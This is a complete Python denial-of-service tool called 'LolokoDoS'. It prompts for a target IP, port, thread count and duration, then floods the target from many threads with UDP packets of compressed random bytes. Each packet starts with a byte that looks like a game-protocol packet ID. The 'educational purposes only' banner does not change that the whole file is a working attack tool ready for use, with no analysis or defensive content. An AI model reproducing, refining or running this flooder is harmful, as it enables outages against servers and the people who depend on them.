import socket
import time
import os
import random
import zlib
import threading

# Code Writed By @lolokooPE
# Writed For Educational Purposes Only!

def ngahhflooder(target_ip, target_port):
  pids = [
    b'\x01',
    b'\x05',
    b'\x07',
    b'\x84',
    b'\x13',
    b'\x80',
    b'\x09'
  ]
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      for i in range(300):
        bytelen = random.randint(512, 1024)
        bytes = os.urandom(bytelen)
        compressed_bytes = zlib.compress(bytes, level=9)
        pid = random.choice(pids)
        packet = pid + compressed_bytes
        s.sendto(packet, (target_ip, target_port))
      s.close()
    except Exception as e:
      print(f"[LolokoDoS] Error: {e}")

banner = """
 _           _       _        ______      _____ 
| |         | |     | |       |  _  \    /  ___|
| |     ___ | | ___ | | _____ | | | |___ \ `--. 
| |    / _ \| |/ _ \| |/ / _ \| | | / _ \ `--. \
| |___| (_) | | (_) |   < (_) | |/ / (_) /\__/ /
\_____/\___/|_|\___/|_|\_\___/|___/ \___/\____/ 
Coded By @lolokooPE - Educational Purposes Only
"""

os.system("clear")
print(banner)
print(" ")

try:
  target_ip = input("[?] Target IP: ")
  target_port = int(input("[?] Target Port: "))
  thrdc = int(input("[?] Threads (Def 100): "))
  hmtimes = int(input("[?] Seconds: "))
  print("[LolokoDoS] Attack will start when all threads all ready.")
  for i in range(thrdc):
    t = threading.Thread(target=ngahhflooder,args=(target_ip, target_port), daemon=True)
    t.start()
  os.system("clear")
  print(banner)
  print(" ")
  print(">> Attack Started <<")
  print(f"Target IP: {target_ip}")
  print(f"Target Port: {target_port}")
  print(f"Threads: {thrdc}")
  print(f"The attack will run for {hmtimes} seconds.")
  time.sleep(hmtimes)

except ValueError:
  print("[LolokoDoS] Please Enter All Input's Correctly!")
except KeyboardInterrupt:
  print("[LolokoDoS] Program Stopped By User (Exit)")
